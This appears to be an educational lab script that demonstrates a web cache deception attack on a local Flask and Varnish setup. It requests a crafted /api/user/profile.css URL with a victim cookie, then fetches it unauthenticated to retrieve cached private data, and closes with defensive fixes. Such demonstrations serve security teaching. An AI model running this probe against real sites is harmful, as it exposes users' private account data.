import urllib.request
import urllib.error
import time

TARGET_HOST = "localhost"
TARGET_PORT = 80
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"


def send_get(path, headers=None):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read().decode("utf-8", errors="replace")
            x_cache = r.headers.get("X-Cache", "N/A")
            cache_hits = r.headers.get("X-Cache-Hits", "0")
            return body, x_cache, cache_hits, r.status
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace"), "N/A", "0", e.code
    except Exception as e:
        return str(e), "N/A", "0", 0


def main():
    print("=== Web Cache Deception ===")

    print(
        "\nBackground:\n"
        "Web Cache Deception tricks a cache into storing a private, dynamic\n"
        "page as if it were a public static asset. The attacker sends the\n"
        "victim a crafted URL like /api/user/style.css — the application\n"
        "ignores the .css suffix and returns the user's private data, while\n"
        "the cache stores it because the URL looks like a static file.\n"
        "The attacker then fetches the same URL and receives the victim's\n"
        "private data directly from cache — no authentication required.\n"
    )

    # ── Step 1: normal /api/user (authenticated) ──────────────────────────────
    print("[1] Normal request to /api/user with victim session cookie.")
    body1, x_cache1, hits1, status1 = send_get(
        "/api/user",
        headers={"Cookie": "session=victim-secret-token"}
    )
    print(f"    Status  : {status1}")
    print(f"    X-Cache : {x_cache1}")
    print(f"    Body    : {body1[:120]}")

    # ── Step 2: cache deception URL (victim visits attacker link) ─────────────
    print("\n[2] Victim visits attacker-crafted URL: /api/user/profile.css")
    print("    (Attacker sends victim this link — e.g. via phishing)")
    body2, x_cache2, hits2, status2 = send_get(
        "/api/user/profile.css",
        headers={"Cookie": "session=victim-secret-token"}
    )
    print(f"    Status  : {status2}")
    print(f"    X-Cache : {x_cache2}")
    print(f"    Body    : {body2[:120]}")

    if x_cache2 == "MISS":
        print("    [!] Response served fresh and now stored in cache under /api/user/profile.css")
    elif x_cache2 == "HIT":
        print("    [!] Already cached — Varnish is serving this as a static asset!")

    # ── Step 3: attacker fetches the same URL without any cookie ──────────────
    print("\n[3] Attacker fetches /api/user/profile.css — NO cookie, NO authentication.")
    time.sleep(0.3)
    body3, x_cache3, hits3, status3 = send_get("/api/user/profile.css")
    print(f"    Status  : {status3}")
    print(f"    X-Cache : {x_cache3}")
    print(f"    Hits    : {hits3}")
    print(f"    Body    : {body3[:200]}")

    print("\n--- Result ---")
    if x_cache3 == "HIT" and status3 == 200:
        print("    [!] ATTACK SUCCESSFUL — attacker retrieved victim's private data from cache!")
        print("    [!] No session cookie was needed — Varnish served it as a public asset.")
        if "role" in body3 or "user" in body3.lower():
            print("    [!] Private user data confirmed in response.")
    elif status3 in (404, 400):
        print("    [✓] Application correctly rejected the .css path — cache deception blocked.")
    else:
        print("    [~] Inconclusive — check Varnish VCL cache rules for static asset handling.")

    print(
        "\nExplanation:\n"
        "1. The attacker crafts a URL that looks like a static asset: /api/user/profile.css\n"
        "2. The application (Flask) ignores the suffix and serves /api/user normally,\n"
        "   returning the victim's private data with the victim's session cookie.\n"
        "3. Varnish sees a .css extension and treats the response as a public static\n"
        "   file — it caches it with no regard for the session cookie.\n"
        "4. The attacker requests the same URL without any authentication.\n"
        "   Varnish returns the cached private response (CACHE HIT).\n"
        "5. The attacker now has the victim's private account data.\n"
        "Defense: configure Varnish to never cache responses that contain\n"
        "   Set-Cookie or private Cache-Control directives; strip path\n"
        "   extensions before cache key lookup; add Vary: Cookie to\n"
        "   all authenticated responses.\n"
    )


if __name__ == "__main__":
    main()